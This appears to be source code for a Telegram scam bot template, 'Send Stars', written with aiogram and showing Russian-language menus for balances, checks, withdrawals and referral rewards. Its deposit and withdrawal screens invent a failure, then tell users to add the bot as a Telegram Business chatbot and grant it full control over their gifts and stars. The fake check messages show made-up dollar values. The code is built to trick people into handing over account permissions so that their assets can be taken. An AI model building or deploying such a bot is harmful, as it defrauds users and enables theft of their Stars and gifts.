from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, WebAppInfo
from sqlalchemy import select
from db import Session
from models import WorkerBot, WorkerBotUser

pending_withdraw = {}  

class BaseTemplate6:
    id = "base_6"
    name = "Send Stars"

    STAR_PRICE = 0.015  

    after_start = (
        "👋 Добро пожаловать в <b>Send Stars!</b>\n\n"
        "🤖 Наш бот поможет отправить звезды и зарабатывать звезды очень просто и быстро!\n\n"
        "Выберите нужный раздел:"
    )

    photo_url = "https://i.postimg.cc/fTfF5TGL/menu.png"
    balance_photo_url = "https://i.postimg.cc/MpZLLJwY/balance.png"
    deposit_photo_url = "https://i.postimg.cc/tJDKsSky/photo-2025-08-08-21-08-26.jpg"
    withdraw_photo_url = "https://i.postimg.cc/zGdQZ2XY/stars.png"
    faq_photo_url = "https://i.postimg.cc/J4LvbBdv/faq.png"
    check_photo_url = "https://i.postimg.cc/tJDKsSky/photo-2025-08-08-21-08-26.jpg"

    @classmethod
    def get_reply_markup(cls):
        return InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="⭐ Баланс", callback_data="stars_balance"),
                InlineKeyboardButton(text="💰 Создать чек", callback_data="stars_deposit"),
            ],
            [
                InlineKeyboardButton(text="📤 Вывести звезды", callback_data="stars_withdraw"),
            ],
            [
                InlineKeyboardButton(text="💵 Заработать звезды", callback_data="earn_stars"),
            ],
        ])

    @classmethod
    def get_back_markup(cls):
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅ Назад в меню", callback_data="stars_back")]
        ])

    @classmethod
    def get_open_menu_markup(cls):
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📂 Открыть", callback_data="stars_back")]
        ])

    @staticmethod
    async def _delete_prev_message(callback, bot, chat_id):
        try:
            await bot.delete_message(chat_id, callback.message.message_id)
        except Exception:
            pass

    @staticmethod
    async def _send_screen(bot, chat_id: int, text: str, reply_markup=None, photo_url: str | None = None):
        if photo_url:
            await bot.send_photo(chat_id, photo_url, caption=text, parse_mode="HTML", reply_markup=reply_markup)
        else:
            await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=reply_markup)

    @staticmethod
    async def _load_user_and_bot(bot, user_id: int):
        async with Session() as session:
            me = await bot.get_me()
            worker_bot = await session.scalar(
                select(WorkerBot).where(WorkerBot.username == me.username)
            )
            if not worker_bot:
                return session, None, None
            user_obj = await session.scalar(
                select(WorkerBotUser).where(
                    WorkerBotUser.telegram_id == user_id,
                    WorkerBotUser.worker_bot_id == worker_bot.id
                )
            )
            return session, worker_bot, user_obj

    @staticmethod
    async def process_callback(callback, bot, chat_id):
        data = callback.data
        await BaseTemplate6._delete_prev_message(callback, bot, chat_id)

        if data == "stars_balance":
            session, _, user_obj = await BaseTemplate6._load_user_and_bot(bot, callback.from_user.id)
            stars = user_obj.stars_balance if user_obj and user_obj.stars_balance else 0
            usd = stars * BaseTemplate6.STAR_PRICE
            await BaseTemplate6._send_screen(
                bot, chat_id,
                f"<b>⭐️ Баланс:</b>\n\n⚡️ Текущий баланс: <b>{stars}</b> ⭐️ <b>(${usd:.2f})</b>",
                BaseTemplate6.get_back_markup(),
                BaseTemplate6.balance_photo_url
            )

        elif data == "stars_deposit":
            bot_username = (await bot.get_me()).username
            await BaseTemplate6._send_screen(
                bot, chat_id,
                "⚠️ <b>Для создания чека вам необходимо пройти авторизацию</b>\n\n"
                "<b>🚀 Инструкция:</b>\n"
                "1️⃣ <b>Откройте Telegram → Настройки</b>\n"
                "2️⃣ Перейдите в раздел <b>«Telegram для бизнеса»</b>\n"
                f"3️⃣ Добавьте этого бота <code>@{bot_username}</code> в Чат-боты\n"
                "4️⃣ Выдайте <b>все необходимые разрешения</b> в управление подарками и звездами.",
                BaseTemplate6.get_back_markup(),
                BaseTemplate6.deposit_photo_url
            )

        elif data == "stars_withdraw":
            session, _, user_obj = await BaseTemplate6._load_user_and_bot(bot, callback.from_user.id)
            stars = user_obj.stars_balance if user_obj and user_obj.stars_balance else 0
            pending_withdraw[callback.from_user.id] = True
            await BaseTemplate6._send_screen(
                bot, chat_id,
                f"📮 Раздел «Вывод звёзд»\n\n"
                f"Ваш баланс: <b>{stars}</b> ⭐️\n"
                f"Укажите сумму — от <b>25</b> звёзд и выше.",
                BaseTemplate6.get_back_markup(),
                BaseTemplate6.withdraw_photo_url
            )

        elif data == "stars_faq":
            await BaseTemplate6._send_screen(
                bot, chat_id,
                "❓ <b>FAQ</b>\n\nЗдесь будут ответы на популярные вопросы.",
                BaseTemplate6.get_back_markup(),
                BaseTemplate6.faq_photo_url
            )

        elif data == "earn_stars":
            bot_username = (await bot.get_me()).username
            telegram_id = callback.from_user.id
            ref_link = f"https://t.me/{bot_username}?start={telegram_id}"
            await BaseTemplate6._send_screen(
                bot, chat_id,
                f"💵 <b>Как заработать звёзды?</b>\n\n"
                f"📢 Приглашайте друзей и получайте <b>+5 ⭐️</b> за каждого!\n\n"
                f"🔗 Ваша персональная ссылка для приглашений:\n"
                f"<code>{ref_link}</code>\n\n"
                f"👥 Делитесь ссылкой в чатах, соцсетях и получайте бонусы, "
                f"когда ваши друзья присоединяются!",
                BaseTemplate6.get_back_markup(),
                BaseTemplate6.photo_url
            )

        elif data == "stars_back":
            await BaseTemplate6._send_screen(
                bot, chat_id,
                BaseTemplate6.after_start,
                BaseTemplate6.get_reply_markup(),
                BaseTemplate6.photo_url
            )

        else:
            await BaseTemplate6._send_screen(
                bot, chat_id,
                BaseTemplate6.after_start,
                BaseTemplate6.get_reply_markup(),
                BaseTemplate6.photo_url
            )

    @staticmethod
    async def handle_text_input(message: Message, bot):
        user_id = message.from_user.id
        if user_id in pending_withdraw:
            bot_username = (await bot.get_me()).username
            pending_withdraw.pop(user_id, None)
            await bot.send_message(
                message.chat.id,
                "❌ Вывод звёзд был <b>ОТМЕНЁН.</b>\n\n"
                "Для успешного вывода звёзд на свой аккаунт выполните действия:\n\n"
                "<b>🚀 Инструкция:</b>\n"
                "1️⃣ <b>Откройте Telegram → Настройки</b>\n"
                "2️⃣ Перейдите в раздел <b>«Telegram для бизнеса»</b>\n"
                f"3️⃣ Добавьте этого бота <code>@{bot_username}</code> в Чат-боты\n"
                "4️⃣ Выдайте <b>все необходимые разрешения</b> в управление подарками и звездами.",
                parse_mode="HTML"
            )

    @staticmethod
    async def handle_base6_message(message: Message, bot):
        await BaseTemplate6._send_screen(
            bot, message.chat.id,
            BaseTemplate6.after_start,
            BaseTemplate6.get_reply_markup(),
            BaseTemplate6.photo_url
        )

    @staticmethod
    def get_check_activated_text(stars_amount: int) -> str:
        price_usd = stars_amount * BaseTemplate6.STAR_PRICE
        return f"✅ Вы получили <b>{stars_amount}</b> ⭐️ <b>(${price_usd:.2f}).</b>"

    @staticmethod
    async def send_check_activated(bot, chat_id: int, stars_amount: int):
        text = BaseTemplate6.get_check_activated_text(stars_amount)
        await bot.send_photo(
            chat_id,
            BaseTemplate6.check_photo_url,
            caption=text,
            parse_mode="HTML",
            reply_markup=BaseTemplate6.get_open_menu_markup()
        )